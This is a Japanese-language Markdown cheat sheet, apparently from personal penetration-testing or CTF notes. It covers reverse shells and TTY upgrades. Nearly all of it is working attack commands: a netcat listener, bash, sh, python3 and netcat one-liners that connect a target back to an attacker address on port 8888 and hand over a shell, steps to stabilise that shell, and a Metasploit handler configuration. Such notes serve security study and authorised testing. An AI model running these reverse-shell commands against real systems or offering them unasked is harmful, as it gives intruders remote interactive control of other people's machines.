---
tags: [hacking, skill, cheatsheet, reverse-shell]
category: ポストエクスプロイト
date: 2026-03-28
---

# リバースシェル & TTY アップグレード

## 概要

ターゲットから攻撃者のマシンへ接続させてシェルを取得する手法。
取得後は TTY をアップグレードして安定した対話型シェルにする。

---

## リバースシェル

### ペイロード生成サイト

https://www.revshells.com/

---

### 攻撃者側: リスナー起動

```bash
nc -lnvp 8888
```

---

### ターゲット側: 接続コマンド

```bash
# bash
bash -c "bash -i >& /dev/tcp/$CLIENT_IP/8888 0>&1"

# sh
sh -i >& /dev/tcp/$CLIENT_IP/8888 0>&1

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$CLIENT_IP",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# nc (netcat)
nc -e /bin/bash $CLIENT_IP 8888
```

---

## TTY アップグレード

リバースシェルは不安定（Ctrl+C で切れる等）なので安定した TTY に昇格させる。

### Step 1: ターゲット側で対話型シェル起動

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# または
script /dev/null -c bash
```

### Step 2: シェルを一時停止して元のターミナルへ戻る

```
Ctrl + Z
# zsh: suspended  nc -lvnp 443
```

### Step 3: ローカルの stty を設定してフォアグラウンドに戻す

```bash
stty raw -echo; fg
```

> これにより Ctrl+C を押してもシェルが切れなくなる

### Step 4: ターミナルサイズを合わせる（任意）

```bash
# ローカルで確認
stty size   # 例: 50 200

# ターゲット側で設定
stty rows 50 cols 200

# TERM 設定
export TERM=xterm
```

---

## Metasploit でリスナーを立てる

```bash
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST <自分のIP>
set LPORT 4444
set ExitOnSession false
run
```

---

## ハマったポイント

- `bash -i >& /dev/tcp/...` は bash がインストールされていないと使えない（sh に切り替え）
- `python3` がない環境では `python` を試す
- TTY アップグレード後は `reset` を実行するとターミナルが正常に戻ることがある

---

## 関連スキル

- [[Skills/Linux-PrivEsc]]
- [[Skills/Cron-Job-Hijacking]]
